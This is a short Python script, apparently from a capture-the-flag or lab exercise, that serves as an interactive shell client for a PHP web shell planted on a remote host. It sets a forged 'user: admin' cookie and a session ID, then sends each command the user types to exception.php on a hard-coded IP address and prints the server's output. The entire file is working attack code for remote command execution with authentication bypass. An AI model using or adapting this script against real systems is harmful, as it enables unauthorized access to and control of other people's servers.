import requests
import base64
import urllib.parse

PHPSESSID="hosfvov8r947ikuq4pam2vp37m"

url_base = "http://157.230.107.175:8001"
url_payload = url_base + "/tmp/%s/exception.php?c=" % PHPSESSID

cookies = {"PHPSESSID": PHPSESSID, "user": "admin"}
while 1:
    command = input("> ")
    command_enc = urllib.parse.quote(command)
    r = requests.get(url_payload + command_enc, cookies=cookies)
    # if r.status_code == 200:
    print(r.text)

